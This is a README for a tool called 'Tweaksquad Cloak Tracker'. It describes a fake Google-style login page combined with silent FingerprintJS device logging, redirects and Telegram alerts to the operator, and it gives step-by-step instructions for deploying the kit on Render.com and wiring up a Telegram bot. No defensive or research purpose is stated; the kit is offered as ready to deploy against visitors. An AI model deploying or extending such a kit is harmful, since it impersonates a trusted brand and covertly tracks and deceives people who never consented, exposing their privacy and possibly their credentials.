# Tweaksquad Cloak Tracker 🕵️‍♂️

Discreet visitor logger using FingerprintJS + Telegram alerts + fake UI cloak.  
Deploy-ready on [Render.com](https://render.com).

## 💾 Files
- `tracker.html` – Google-style fake login
- `logger.php` – Silent device logger + redirect + alerts
- `log.csv` – All visitors
- `redirect_log.csv` – Only redirected users
- `known_fingerprints.txt` – Alert suppression

## 🚀 Deploy on Render
1. Fork this repo
2. Go to [Render.com](https://dashboard.render.com)
3. New Web Service → connect your fork
4. Set:
   - Runtime: PHP
   - Root Directory: (leave blank)
   - Publish Directory: `public/`
   - Start Command: *(empty)*
   - Build Command: *(empty)*
5. Click **Deploy**

## 📲 Telegram Bot
1. Create bot via [@BotFather](https://t.me/BotFather)
2. Get your User ID via `getUpdates`
3. Set `.env` vars or hardcode into `logger.php`:
   ```php
   $token = 'YOUR_BOT_TOKEN';
   $chatId = 'YOUR_TELEGRAM_ID';
